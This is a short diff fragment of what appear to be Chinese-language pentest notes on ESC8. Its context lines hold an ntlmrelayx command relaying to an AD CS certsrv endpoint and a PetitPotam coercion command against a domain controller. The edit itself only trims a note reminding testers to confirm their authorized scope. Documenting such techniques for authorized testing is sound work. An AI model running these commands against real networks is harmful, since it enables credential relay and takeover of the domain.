@@ -30,4 +30,4 @@ ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template M
 python3 PetitPotam.py -u user -p pass -d domain.local 192.168.1.50 dc01.domain.local
 ```
 
-小记录：验证前确认授权范围和监听地址。记录时把触发方法、目标主机、认证方向和 AD CS 配置状态放在一起。
+验证前确认授权范围和监听地址。记录时把触发方法、目标主机、认证方向和 AD CS 配置状态放在一起。
